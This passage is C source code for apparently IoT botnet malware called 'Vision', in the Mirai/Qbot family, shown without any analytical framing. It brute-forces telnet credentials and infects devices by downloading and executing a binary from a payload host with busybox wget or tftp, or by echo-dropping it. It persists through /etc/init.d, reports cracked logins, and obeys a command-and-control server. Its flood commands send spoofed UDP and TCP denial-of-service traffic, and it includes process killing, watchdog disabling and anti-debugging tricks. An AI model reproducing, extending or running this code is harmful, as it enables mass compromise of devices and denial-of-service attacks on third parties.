                    sockprintf(mainCommSock, "[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
                }
                else {
                    sockprintf(mainCommSock, "[scanner] FD%d error while connecting = %d\n", conn->fd, err);
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd)) {
                while (TRUE) {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE) {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0) {
                        sockprintf(mainCommSock, "[scanner] FD%d connection gracefully closed\n", conn->fd);
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1) {
                        if (errno != EAGAIN && errno != EWOULDBLOCK) {
                            sockprintf(mainCommSock, "[scanner] FD%d lost connection\n", conn->fd);

                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 10) {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else {
                                setup_connection(conn);
                                sockprintf(mainCommSock, "[scanner] FD%d retrying with different auth combo!\n", conn->fd);
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE) {
                        int consumed = 0;

                        switch (conn->state) {
                            case SC_HANDLE_IACS:
                                if ((consumed = consume_iacs(conn)) > 0) {
                                    conn->state = SC_WAITING_USERNAME;
                                    sockprintf(mainCommSock, "[scanner] FD%d finished telnet negotiation\n", conn->fd);
                                }
                                break;
                            case SC_WAITING_USERNAME:
                                if ((consumed = consume_user_prompt(conn)) > 0) {
                                    /*
                                    send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                    */
                                    sockprintf(conn->fd, "%s\r\n", conn->auth->username);
                                    conn->state = SC_WAITING_PASSWORD;
                                    sockprintf(mainCommSock, "[scanner] FD%d received username prompt\n", conn->fd);
                                }
                                break;
                            case SC_WAITING_PASSWORD:
                                if ((consumed = consume_pass_prompt(conn)) > 0)
                                {
                                    sockprintf(mainCommSock, "[scanner] FD%d received password prompt\n", conn->fd);


                                    // Send password
                                    /*
                                    send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                    */
                                    sockprintf(conn->fd,"%s\r\n", conn->auth->password);

                                    conn->state = SC_WAITING_RESP;
                                }
                                break;
                            case SC_WAITING_RESP:
                                if((consumed = consume_any_prompt(conn)) > 0) {
                                    sockprintf(mainCommSock, "[scanner] FD%d logged in %s:%s", conn->fd, conn->auth->username, conn->auth->password);

                                    sockprintf(mainCommSock, "[scanner] FD%d received enable prompt\n", conn->fd);
                                    sockprintf(conn->fd, "enable\r\n");

                                    sockprintf(mainCommSock, "[scanner] FD%d received system prompt\n", conn->fd);
                                    sockprintf(conn->fd, "system\r\n");

                                    sockprintf(mainCommSock, "[scanner] FD%d received shell prompt\n", conn->fd);
                                    sockprintf(conn->fd, "shell\r\n");

                                    sockprintf(mainCommSock, "[scanner] FD%d received sh prompt\n", conn->fd);
                                    sockprintf(conn->fd, "sh\r\n");

                                    sockprintf(conn->fd, "/bin/busybox VISION\r\n");
                                    conn->state = SC_PARSE_ELF_RESPONSE;
                                }
                                break;
                            case SC_PARSE_ELF_RESPONSE:
                                if((consumed = consume_any_prompt(conn)) > 0) {
                                    int ret = parse_elf_response(conn);
                                    if(!ret) {
                                        conn->bit = 0;
                                        conn->endianness = 0;
                                        conn->machine = 0;
                                        memset(conn->arch, 0, 32);
                                        continue;
                                    }
                                    conn->state = SC_INFECTION_PAYLOAD_DETECTION;
                                }
                                break;
                            case SC_INFECTION_PAYLOAD_DETECTION:
                                if((consumed = consume_any_prompt(conn)) > 0) {
                                    sockprintf(conn->fd, "/bin/busybox wget;/bin/busybox tftp");
                                    if(util_memsearch(conn->rdbuf, conn->rdbuf_pos, "Usage: wget", 11) != -1) {
                                        conn->bit = 0;
                                        conn->endianness = 0;
                                        conn->machine = 0;
                                        conn->state = SC_INFECTION_PAYLOAD_WGET;
                                    }
                                    if(util_memsearch(conn->rdbuf, conn->rdbuf_pos, "Usage: tftp", 11) != -1) {
                                        conn->bit = 0;
                                        conn->endianness = 0;
                                        conn->machine = 0;
                                        conn->state = SC_INFECTION_PAYLOAD_TFTP;
                                    }
                                    else conn->state = SC_INFECTION_PAYLOAD_ECHO;
                                }
                                break;
                            case SC_INFECTION_PAYLOAD_WGET:
                                if((consumed = consume_any_prompt(conn)) > 0) {
                                    sockprintf(mainCommSock, "[scanner] FD%d using wget to download and execute %s\n", conn->fd, bindetection());
                                    sockprintf(conn->fd, "/bin/busybox wget http://%s/%s;/bin/busybox chmod 777 %s;./%s", binaryhostaddr, bindetection(), bindetection(), conn->fd);
                                    conn->bit = 0;
                                    conn->endianness = 0;
                                    conn->machine = 0;
                                    conn->state = SC_WAITING_TOKEN_RESP;
                                }
                                break;
                            case SC_INFECTION_PAYLOAD_TFTP:
                                if((consumed = consume_any_prompt(conn)) > 0) {
                                    sockprintf(mainCommSock, "[scanner] FD%D Attempting infecton via tftp\n");
                                    sockprintf(conn->fd, "cd /tmp/;/bin/busybox tftp -g -r %s %s;chmod 777 %s;./%s", bindetection(), binaryhostaddr, bindetection(), bindetection());
                                    conn->bit = 0;
                                    conn->endianness = 0;
                                    conn->machine = 0;
                                    conn->state = SC_WAITING_TOKEN_RESP;
                                }
                                break;
                            case SC_INFECTION_PAYLOAD_ECHO:
                                if((consumed = consume_any_prompt(conn)) > 0) {
                                    p = get_retrieve_binary(conn);
                                    if(!p) {
                                        free(p);
                                        sockprintf(mainCommSock, "[scanner] failed to retrieve a dropper\n");
                                        conn->bit = 0;
                                        conn->endianness = 0;
                                        conn->machine = 0;
                                        memset(conn->arch, 0, 32);
                                    }

                                    bin = process_retrieve_binary(conn, p);
                                    if(!bin) {
                                        free(bin);
                                        sockprintf(mainCommSock, "[scanner] failed to process the retrieve binary\n");
                                        conn->bit = 0;
                                        conn->endianness = 0;
                                        conn->machine = 0;
                                        memset(conn->arch, 0, 32);
                                        continue;
                                    }
                                    sockprintf(mainCommSock, "[scanner] Processed retrieve binary, binary index %d\n", bin->index);

                                    if(sockprintf(conn->fd, "/bin/busybox echo -en '%s' %s .ULTRON; %s", bin[conn->dropper_index].str, conn->dropper_index == 0 ? ">":">>", conn->dropper_index == bin->index ? "/bin/busybox chmod 777 .ULTRON;./.ULTRON;":"\n") < 1) {
                                        conn->bit = 0;
                                        conn->endianness = 0;
                                        conn->machine = 0;
                                        memset(conn->arch, 0, 32);
                                        continue;
                                    }
                                    sockprintf(mainCommSock, "[scanner] Echo loader dropped line %d of payload %s -> %s\n", bin[conn->dropper_index].str, conn->arch, conn->dst_addr);

                                    conn->state = SC_WAITING_TOKEN_RESP;
                                }
                                break;
                            case SC_REBOOT_SURIVAL:
                            {
                                consumed=consume_any_prompt(conn);
                                if(consumed){
                                    sockprintf(mainCommSock, "[scanner] Mirroring binary's to survive device reboot.\n");
                                    if(sockprintf(conn->fd, "cd /tmp/;/bin/busybox cp %s /etc/init.d;/bin/busybox chmod 777 /etc/init.d/%s\r\n", bindetection(), bindetection())< 1) {
                                        conn->bit = 0;
                                        conn->endianness = 0;
                                        conn->machine= 0;
                                        memset(conn->arch, 0, 32);
                                        continue;
                                    }
                                }
                            }
                                break;
                            case SC_WAITING_TOKEN_RESP:
                                consumed = consume_resp_prompt(conn);
                                if (consumed == -1) {
                                    sockprintf(mainCommSock, "[scanner] FD%d invalid username/password combo\n", conn->fd);

                                    close(conn->fd);
                                    conn->fd = -1;

                                    // Retry
                                    if (++(conn->tries) == 10) {
                                        conn->tries = 0;
                                        conn->state = SC_CLOSED;
                                    }
                                    else {
                                        setup_connection(conn);
                                        sockprintf(mainCommSock, "[scanner] FD%d retrying with different auth combo!\n", conn->fd);
                                    }
                                }
                                else if (consumed > 0)
                                {

                                    sockprintf(mainCommSock, "[scanner] FD%d Found verified working telnet\n", conn->fd);
                                    report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                    close(conn->fd);
                                    conn->fd = -1;
                                    conn->state = SC_CLOSED;
                                }
                                break;
                            default:
                                consumed = 0;
                                break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0) break;
                        else {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, (size_t) conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}


void processCmd(int argc, unsigned char *argv[])
{
        if (!strcmp((const char *) argv[0], "PING"))
            return;

        if (!strcmp((const char *) argv[0], "V_U")) {
            // !* UDP TARGET PORT TIME PACKETSIZE POLLINTERVAL
            if (argc < 6 || atoi((const char *) argv[3]) == -1 || atoi((const char *) argv[2]) == -1 || atoi((const char *) argv[4]) == -1 || atoi((const char *) argv[4]) > 1024 || (argc == 6 && atoi((const char *) argv[5]) < 1))
            {
                    return;
            }
            unsigned char *ip = argv[1];
            int port = atoi((const char *) argv[2]);
            int time = atoi((const char *) argv[3]);
            int packetsize = atoi((const char *) argv[4]);
            int pollinterval = (argc == 6 ? atoi((const char *) argv[5]) : 10);
            int spoofed = 32;
            if (strstr((const char *)ip, ",") != NULL) {
                unsigned char *hi = (unsigned char *) strtok((char *) ip, ",");
                while (hi != NULL) {
                    if (!listFork()) {
                        SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            }
            else
            {
                if (listFork())
                {
                        return;
                }
                SendUDP(ip, port, time, packetsize, pollinterval, spoofed);
                _exit(0);
            }
        }
        if (!strcmp((const char *) argv[0], "V_T")) {
                //!* TCP TARGET PORT TIME FLAGS PACKETSIZE POLLINTERVAL
                if (argc < 6 || atoi((const char *) argv[3]) == -1 || atoi((const char *) argv[2]) == -1 || (argc > 5 && atoi((const char *) argv[5]) < 0) || (argc == 7 && atoi((const char *) argv[6]) < 1)) {
                        return;
                }
                unsigned char *ip = argv[1];
                int port = atoi((const char *) argv[2]);
                int time = atoi((const char *) argv[3]);
                unsigned char *flags = argv[4];
                int pollinterval = argc == 7 ? atoi((const char *) argv[6]) : 10;
                int packetsize = argc > 5 ? atoi((const char *) argv[5]) : 0;
                int spoofed = 32;
                if (strstr((const char *) ip, ",") != NULL) {
                    unsigned char *hi = (unsigned char *) strtok(ip, ",");
                    while (hi != NULL)
                    {
                        if (!listFork())
                        {
                                SendTCP(hi, port, time, flags, packetsize, pollinterval, spoofed);
                                _exit(0);
                        }
                        hi = strtok(NULL, ",");
                    }
                }
                else {
                    if (listFork()) {
                            return;
                    }
                    SendTCP(ip, port, time, flags, packetsize, pollinterval, spoofed);
                    _exit(0);
                }
        }

        if (!strcmp((const char *) argv[0], "V_S")) {
                //!* STD TARGET PORT TIME
            if (argc < 4 || atoi((const char *) argv[2]) < 1 || atoi((const char *) argv[3]) < 1) {
                    return;
            }
            unsigned char *ip = argv[1];
            int port = atoi((const char *) argv[2]);
            int time = atoi((const char *) argv[3]);
            if (strstr((const char *)ip, ",") != NULL) {
                    unsigned char *hi = (unsigned char *) strtok((char *) ip, ",");
                    while (hi != NULL)
                    {
                            if (!listFork())
                            {
                                    SendSTD(hi, port, time);
                                    _exit(0);
                            }
                            hi = strtok(NULL, ",");
                    }
            }
            else
            {
                    if (listFork())
                    {
                            return;
                    }
                    SendSTD(ip, port, time);
                    _exit(0);
            }
        }

        if (!strcmp((const char *) argv[0], "V_K")) {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
                {
                        if (pids[i] != 0 && pids[i] != getpid())
                        {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
        }

        if(!strcmp((const char *) argv[0], "V_TSK")) {
            scanner_kill();
        }
        if (!strcmp((const char *) argv[0], "V_KBP")) {
            exit(0);
        }
}
int initConnection()
{
        if (mainCommSock)
        {
                close(mainCommSock);
                mainCommSock = 0;
        }
        if (currentServer + 1 == SERVER_LIST_SIZE)
                currentServer = 0;
        currentServer++;
        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
        if (!connectTimeout(mainCommSock, (char *) commServer, port, 30))
                return 1;
        return 0;
}


int fd_ctrl = -1;
static void ensure_single_instance(void) {

    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127, 0, 0, 1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)) == -1) {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
        sockprintf(mainCommSock, "[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)) == -1) {
            sockprintf(mainCommSock, "[main] Failed to connect to fd_ctrl to request process termination\n");
        }

        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    } else {
        if (listen(fd_ctrl, 1) == -1) {
            sockprintf(mainCommSock, "[main] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
        }
        sockprintf(mainCommSock, "[main] We are the only process on this system!\n");
    }
}
static void resolve_cnc_addr(void) {
    struct resolv_entries *entries;
    struct sockaddr_in srv_addr;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL) {
        sockprintf(mainCommSock, "[main] Failed to resolve CNC address\n");
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    sockprintf(mainCommSock, "[main] Resolved domain\n");
}

void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
static void anti_gdb_entry(int sig) {
    resolve_func = resolve_cnc_addr;
}
static BOOL unlock_tbl_if_nodebug(char *argv0)
{
// ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
int i, ii = 0, c = 0;
uint8_t fold = 0xAF;
void (*obf_funcs[]) (void) = {
        (void (*) (void))ensure_single_instance,
        (void (*) (void))table_unlock_val,
        (void (*) (void))table_retrieve_val,
        (void (*) (void))table_init, // This is the function we actually want to run
        (void (*) (void))table_lock_val,
        (void (*) (void))util_memcpy,
        (void (*) (void))util_strcmp,
        (void (*) (void))killer_init,
        (void (*) (void))anti_gdb_entry
};
BOOL matches;

for (i = 0; i < 7; i++)
    c += (long)obf_funcs[i];
if (c == 0)
    return FALSE;

// We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
for (i = 0; i < sizeof (buf_src); i += 3)
{
    char tmp = buf_src[i];

    buf_dst[ii++] = buf_src[i + 1];
    buf_dst[ii++] = tmp;

    // Meaningless tautology that gets you right back where you started
    i *= 2;
    i += 14;
    i /= 2;
    i -= 7;

    // Mess with 0xAF
    fold += ~argv0[ii % util_strlen(argv0)];
}
fold %= (sizeof (obf_funcs) / sizeof (void *));

#ifndef DEBUG
    (obf_funcs[fold])();
    matches = util_strcmp(argv0, buf_dst);
    util_zero(buf_src, sizeof (buf_src));
    util_zero(buf_dst, sizeof (buf_dst));
    return matches;
#else
    table_init();
    return TRUE;
#endif
}

int main(int argc, char *argv[]) {
    sockprintf(mainCommSock, "[main] [%s] Vision initialized using the %s binary.\n", getBuild(), bindetection());
    printf("[main] [%s] Vision initialized using the %s binary.\n", getBuild(), bindetection());
    const char *lolsuckmekid = "";
    if (SERVER_LIST_SIZE <= 0) return 0;
    else {
        strncpy(argv[0], "", strlen((const char *) argv[0]));
        argv[0] = "";
        prctl(PR_SET_NAME, (unsigned long) lolsuckmekid, 0, 0, 0);
        srand((unsigned int) (time(NULL) ^ getpid()));
        init_rand((uint32_t) (time(NULL) ^ getpid()));
        pid_t pid1;
        int status;
        if ((pid1 = fork())) {
            waitpid(pid1, &status, 0);
            exit(0);
        }
        int wfd;
        if ((wfd = open("/dev/watchdog", 2)) != -1 || (wfd = open("/dev/misc/watchdog", 2)) != -1) {
            int one = 1;

            ioctl(wfd, 0x80045704, &one);
            close(wfd);
        }
        chdir("/");
        setuid(0);
        seteuid(0);
        signal(SIGPIPE, SIG_IGN);
#ifdef DEBUG
        unlock_tbl_if_nodebug(argv[0]);
        anti_gdb_entry(0);
#else
        if (unlock_tbl_if_nodebug(argv[0]))
            raise(SIGTRAP);
#endif
        while (1) {
            if (fork() == 0) {
                sockprintf(mainCommSock, "[main] Initializing connection\n");
                printf("[main] Initializing connection\n");
                if(initConnection())continue;
                printf("[main] Initializing killer\n");
                sockprintf(mainCommSock, "[main] Initializing killer\n");
                killer_init();
                printf("[main] Initializing scanner\n");
                scanner_init();
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while ((got = recvLine(mainCommSock, (unsigned char *) commBuf, 4096)) != -1) {
                    for (i = 0; i < numpids; i++)
                        if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                            unsigned int *newpids, on;
                            for (on = (unsigned int) (i + 1); on < numpids; on++)
                                pids[on - 1] = pids[on];
                            pids[on - 1] = 0;
                            numpids--;
                            newpids = (unsigned int *) malloc((numpids + 1) * sizeof(unsigned int));
                            for (on = 0; on < numpids; on++)
                                newpids[on] = pids[on];
                            free(pids);
                            pids = newpids;
                        }
                    commBuf[got] = 0x00;
                    trim(commBuf);

                    if(strstr(commBuf, "PING") == commBuf) continue;
                    if(strstr(commBuf, "DUP") == commBuf) exit(0); // DUP

                    unsigned char *message = (unsigned char *) commBuf;
                    if (*message == '!') {
                        unsigned char *nickMask = message + 1;
                        while (*nickMask != ' ' && *nickMask != 0x00)
                            nickMask++;
                        if (*nickMask == 0x00)
                            continue;
                        *(nickMask) = 0x00;
                        nickMask = message + 1;
                        message = message + strlen((const char *) nickMask) + 2;
                        while (message[strlen((const char *) message) - 1] == '\n' ||
                               message[strlen((const char *) message) - 1] == '\r')
                            message[strlen((const char *) message) - 1] = 0x00;
                        unsigned char *command = message;
                        while (*message != ' ' && *message != 0x00)
                            message++;
                        *message = 0x00;
                        message++;
                        unsigned char *tmpcommand = command;
                        while (*tmpcommand) {
                            *tmpcommand = (unsigned char) toupper(*tmpcommand);
                            tmpcommand++;
                        }
                        unsigned char *params[10];
                        int paramsCount = 1;
                        unsigned char *pch = (unsigned char *) strtok((char *) message, " ");
                        params[0] = command;
                        while (pch) {
                            if (*pch != '\n') {
                                params[paramsCount] = (unsigned char *) malloc(strlen(
                                        (const char *) pch) + 1);
                                memset(params[paramsCount], 0, strlen((const char *) pch) + 1);
                                strcpy((char *) params[paramsCount], (const char *) pch);
                                paramsCount++;
                            }
                            pch = (unsigned char *) strtok(NULL, " ");
                        }
                        processCmd(paramsCount, params);
                        if (paramsCount > 1) {
                            int q;
                            for (q = 1; q < paramsCount; q++) {
                                free(params[q]);
                            }
                        }
                    }
                }
            }
            return 0;
        }
    }
}

#pragma clang diagnostic pop
